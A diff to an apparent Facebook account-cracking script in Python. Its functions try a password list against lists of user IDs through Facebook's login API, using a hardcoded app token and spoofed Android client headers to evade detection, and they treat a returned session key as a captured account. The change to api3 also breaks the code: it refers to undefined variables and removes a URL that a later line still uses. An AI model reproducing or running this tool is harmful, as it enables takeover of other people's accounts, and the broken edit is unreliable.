@@ -1,6 +1,7 @@
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
+
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -451,12 +452,12 @@ def api2(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(100000, 400000)),
+                                        'x-fb-sim-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':'Davik/2.1.0 (linex; U; Android 11.0.0; Samsung Galaxy S10 Build/46693ab8-f3f0-4713-9d99-a7ed13bc37fc [FBAN/FB4A;FBAV/555.0.0.123;FBBV/123456789;FBDM/{density=2.0,width=720,height=1280};FBLC/es_CU;FBRV/123456789;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S10;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
-                                        'x-fb-net-hni':str(random.randint(100000, 400000)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
+                                        'x-fb-net-hni':str(random.randint(20000, 40000)),
+                                        'x-fb-connection-bandwidth':str(random.randint(20000000, 30000000)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
@@ -532,7 +533,7 @@ def api3(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://api.facebook.com/method/auth/login'
+                                post = ses.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers)
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
